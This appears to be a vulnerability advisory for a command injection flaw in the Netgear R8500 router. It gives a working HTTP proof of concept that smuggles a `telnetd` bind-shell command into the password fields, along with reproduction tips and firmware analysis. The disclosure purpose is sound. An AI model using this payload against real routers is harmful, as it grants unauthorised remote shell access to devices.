# Netgear R8500  Router Vulnerability

## Basic infomation

* Vendor: Netgear

* Product: R8500

* Firmware version: V1.0.2.158

* Firmware download link: https://www.downloads.netgear.com/files/GDC/R8500/R8500-V1.0.2.158_1.0.105.zip

* Type:Remote Command Execution

* author:donothingme

## Vulnerability description

We found a Command Injection vulnerability in Netgear R8500 router, which allows an authenticated attacker to execute arbitrary OS commands by a crafted request.



In set password page(http://www.routerlogin.net/genie_admin_account.htm), we can set new password. 

The `sysNewPasswd` and `sysConfirmPasswd` fields have a command injection vulnerability. If we set the two fields equal to `%24%28telnetd+-l+%2Fbin%2Fsh+-p+33333+-b+0.0.0.0%29`, we can actually execute command which `$(telnetd -l /bin/sh -p 33333-b 0.0.0.0)`.

The POC like follows:

```
POST /admin_account.cgi?id=7b1f57fc21e93455c9661ac4b027ee24b675c5cdbe2364d4783154751352f378 HTTP/1.1
Host: 192.168.1.1
Proxy-Connection: keep-alive
Content-Length: 195
Cache-Control: max-age=0

sysNewPasswd=%24%28telnetd+-l+%2Fbin%2Fsh+-p+33333+-b+0.0.0.0%29&sysConfirmPasswd=%24%28telnetd+-l+%2Fbin%2Fsh+-p+33333+-b+0.0.0.0%29&question1=1&answer1=test&question2=1&answer2=test&next=submit
```

And as we can see, after send the craft request, the command is actually executed, and we can get a shell.

**Some tips to trigger vulnerability:**

* Use IP address(192.168.1.1) instead of url(www.routerlogin.net) to access web page
* Plug in the USB stick to make sure reproduce successfunly

## Firmware analysis

We can locate the vulnerability function by string "admin_account.cgi".

In function `sub_72934`, the `sysNewPasswd` field is directly saved in nvram config, and this field is directly controlled by attackers.

The nvram value `htt_passwd` is used in many functions, and some functions use this value to execute function `system()`, so it will cause a command injection vulnerability.
